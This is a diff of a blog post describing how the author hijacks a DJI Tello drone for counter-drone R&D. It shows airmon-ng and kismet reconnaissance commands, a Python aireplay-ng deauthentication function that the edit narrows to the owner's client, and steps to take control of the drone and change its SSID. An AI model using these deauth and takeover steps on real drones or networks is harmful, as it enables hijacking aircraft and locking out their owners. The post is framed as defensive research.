@@ -1,7 +1,7 @@
 # A way to hack Dji Tello
 
-I got an R&D job a few weeks ago that required me to hack multiple drones, also known as *Counter-Unmanned Aircraft Swarm System*.
-This is a complicated and vast subject; I'm in charge of confrontation and simulation work, but this is my first foray into the field, so first and foremost, I need to understand how to hack a single simple drone.
+I got an R&D job few weeks ago that required me to hack multiple drones, also known as *Counter-Unmanned Aircraft Swarm System*.
+I'm in charge of confrontation and simulation work, but this is my first foray into the field, so first and foremost, I need to understand how to hack a single simple drone.
 
 ## System design
 
@@ -11,11 +11,11 @@ Using a **DJI Tello** drone play victim role, a **Rock Pi** as attacker program 
 
 Two Wi-Fi cards are also required, one of which must be in monitor mode.
 
-> I  chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu Focal **didn't enable** this driver by default; make sure you choose a usable driver will make your life easier.
+> I  chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu Focal **didn't enable** this driver by default; choose a right device make your life easier.
 
-I use front-end and back-end separated web service architecture as CUAS, meanwhile I use RockPi board as a web server, follow the [document](https://wiki.radxa.com/Rock4/getting_started) write **Ubuntu 20.04 Server** image to it.
+This system use front-end and back-end separated web service architecture, based on Ubuntu Server OS.
 
-After that, install the necessary software `kismet`, `python3.8` and `aircrack-ng`.
+Use `kismet` to monitor devices information, `aircrack-ng` handle de-auth attack, `NetworkManager` and `python-socket` controls connection.
 
 ### Take a try first
 
@@ -23,7 +23,7 @@ After that, install the necessary software `kismet`, `python3.8` and `aircrack-n
 sudo airmon-ng start <wlan_card> # Enable monitor.
 
 # Browser `localhost:2501` to use kismet web UI,
-# you can find drone's MAC address easily.
+# you can find drone`s MAC address easily.
 kismet -c <wlan_card_mon>
 
 # Connect to your drone from phone app, and de-authentication yourself
@@ -73,6 +73,7 @@ export async function getDroneInfo() {
                     "uav.device",
                     "kismet.device.base.commonname",
                     "kismet.device.base.channel",
+                    "dot11.device/dot11.device.associate_ssid_map"
                 ],
             },
             ...(Option || []),
@@ -92,18 +93,20 @@ import asyncio
 from pyrcrack import AireplayNg
 
 
-async def deauth(interface, macaddr):
+async def deauth(interface, macaddr, cliaddr):
     async with AireplayNg() as aireplay:
-        async for res in aireplay(interface, deauth=10, D=True, a=macaddr):
+        async for res in aireplay(interface, deauth=10, D=True, a=macaddr, c=cliaddr):
             await asyncio.sleep(1)
 
 # Usage:
-# asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr'))
+# asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr','dot11.device/dot11.device.associate_ssid_map'))
 ```
+
+Declare "cliaddr" which is the last connection device from drone, let de-auth attack only effect between drone and its owner.
 
 ### Controller
 
-Because the GameSir T1d cannot connect to the drone directly when hacked, I decided to use **TelloPy** as controller middleware to convert the T1d signal into a drone control command.
+Duo to the GameSir T1d cannot connect to the drone directly when hacked, I decided to use **TelloPy** as controller middleware to convert the T1d signal into a drone control command.
 
 T1d uses Bluetooth protocol to transmit data; there are three Services, with the third receiving an unchanged byte stream and the second changing at random.
 The byte stream received by a Service whose UUID begins with `00008651` changes on a regular basis.
@@ -347,13 +350,13 @@ if __name__ == '__main__':
 
 ```
 
-There are still some '"TODO:"' items to complete, such as the rub connection and changing the SSID; I won't go into detail in this blog, but here are some points:
+There are still some "TODO:" items to complete, such as the rub connection and changing the SSID; I won't go into detail in this blog, but here are some points:
 
 - Ubuntu controls Wi-Fi via NetworkManager, I use d-bus to control NetworkManager. Create a multithreaded process that sends connection requests erratically during a de-auth attack.
 
-- The Tello SDK includes a Python example that demonstrates how to send a text command:'sock.sendto('wifi new ssid> pwd>', tello address)'.
+- The Tello SDK includes a Python example that demonstrates how to send a text command: `sock.sendto('wifi new ssid> pwd>', tello address)`.
 
-> You must connect twice. The first time, use udp socket to send change SSID command and break, and the second time, use TelloPy to transmit controller signal.
+- The hole program has multiple job running in asynchronous, jobs need response a statue to frontend, use a task queue such as `flask-celery` will make schedule easier.
 
 ## References & Spacial thanks
 
